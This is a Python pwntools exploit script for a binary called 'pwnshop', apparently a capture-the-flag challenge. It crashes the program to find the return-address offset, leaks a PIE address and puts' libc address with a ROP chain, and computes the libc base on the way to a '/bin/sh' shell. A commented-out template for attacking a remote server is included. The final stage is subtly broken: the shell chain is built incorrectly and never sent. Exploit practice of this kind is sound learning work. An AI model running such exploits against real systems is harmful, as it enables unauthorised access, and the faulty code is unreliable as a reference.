from pwn import *
import time
import warnings


def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', '1')  # Try to buy something
    p.sendlineafter('Enter details:', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

warnings.filterwarnings(action='ignore', category=BytesWarning)

# Set up pwntools for the correct architecture
exe = './pwnshop'

elf = ELF("./pwnshop")
context.binary = elf
context.log_level = "debug"
context(terminal=['tmux', 'split-window', '-h'])

# libc = elf.libc
# LOCAL
io = elf.process()
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# REMOTE
# io = pwn.remote("SERVER", "PORT")
# libc = pwn.ELF("'libc6_2.23-0ubuntu11.2_amd64.so'")

rop = ROP(elf)

# Start
# pwn.gdb.attach(p, gdbscript)

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(100))

# Useful gadget / address offsets
pop_rdi = rop.find_gadget(['pop rdi', 'ret', ])[0] #0x13c3  # pop rdi; ret;
sub_rsp_28 = 0x1219  # sub rsp, 0x28; ret;

# Leak address
io.sendlineafter('>', '2')  # Try to sell something
io.sendlineafter('What do you wish to sell?', 'COCHINO')  # Doesn't matter
io.sendlineafter('How much do you want for it?', 'A' * 7)  # Leak address
io.recvuntil('A\n')
leaked_addr = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("leaked_address: %#x", leaked_addr)

# Calculate the PIE base (GDB) and update ELF
elf.address = leaked_addr - 0x40C0  # 0x40c0 (.bss - &DAT_001040c0)
info("pie_base: %#x", elf.address)

rop.raw([
    elf.address + pop_rdi,
    elf.got.puts,
    elf.plt.puts,
    elf.address + 0x132a
    ])

# Calculate padding
padding = (offset - len(rop.chain()))
# Payload to increase stack space and leak libc foothold
# payload = flat({padding: [rop.chain(), elf.address + sub_rsp_28]})

# Leak libc
rop = ROP(libc)
rop.puts(elf.got['puts'])
rop.raw([elf.address + 0x132a, elf.address + sub_rsp_28])

io.sendline('1')  # Try to buy something
#io.sendlineafter('Enter details:', payload)
io.sendafter('Enter details:', b'A'*padding + rop.chain())

# Get our leaked puts address
got_puts = unpack(io.recvline().strip()[:6].ljust(8, b"\x00"))
info("got_puts: %#x", got_puts)

# Calculate libc base
libc.address = got_puts - libc.symbols.puts #0x765f0
info("libc_base: %#x", libc.address)

# # Calculate system offset
# system_addr = libc.symbols.system #libc_base + 0x0453a0# 0x48e50
# info("system_addr: %#x", system_addr)
# # Calculate "/bin/sh" offset
# bin_sh = next(libc.search(b'/bin/sh\x00')) #libc_base + 0x18ce17 #0x18a156
# info("bin_sh: %#x", bin_sh)

rop = ROP(libc)
rop = ROP(libc.search(b'/bin/sh\x00'))
rop.raw([elf.address + 0x132a])

io.interactive()